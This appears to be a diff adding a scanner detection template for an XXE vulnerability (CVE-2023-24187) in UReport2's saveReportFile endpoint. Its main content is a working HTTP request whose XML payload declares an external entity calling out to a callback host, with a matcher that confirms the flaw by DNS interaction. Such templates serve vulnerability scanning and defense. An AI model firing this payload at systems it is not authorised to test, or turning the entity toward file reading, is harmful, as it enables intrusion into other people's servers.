@@ -1,0 +1,46 @@
+id: ureport2-savereportfile-xxe
+
+info:
+  name: UReport2 saveReportFile - XXE
+  author: bl
+  severity: high
+  reference:
+    - https://avd.aliyun.com/detail?id=AVD-2023-24187
+  description: |
+      UReport2 saveReportFile接口存在XXE漏洞，该接口可以通过主动路径/ureport/designer进行探测
+  classification:
+    cwe-id: CWE-611
+    cve-id: CVE-2023-24187
+  tags: Ureport2
+
+variables:
+  randstr: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /ureport/designer/saveReportFile HTTP/1.1
+        Host: {{Hostname}}
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Dest: empty
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+        Cookie: JSESSIONID=80D51E98D47AD08AFB9F6D6EEFE144D6
+        sec-ch-ua: "Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"
+        Sec-Fetch-Mode: cors
+        Accept: */*
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        sec-ch-ua-mobile: ?0
+        Accept-Language: zh-CN,zh;q=0.9
+        Accept-Encoding: gzip, deflate, br, zstd
+        sec-ch-ua-platform: "macOS"
+        Content-Length: 157
+
+        file=file:{{randstr}}.ureport.xml&content=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0A%3C%21DOCTYPE+foo+%5B%0A+%3C%21ELEMENT+root+ANY+%3E%0A+%3C%21ENTITY+xxe+SYSTEM+%22http://{{interactsh-url}}%22+%3E%0A%5D%3E%0A%3Cureport%3E%0A+%3Ccell+name%3D%22A1%22%3E%0A+%3Ctext%3E%26xxe%3B%3C%2Ftext%3E%0A+%3C%2Fcell%3E%0A%3C%2Fureport%3E
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
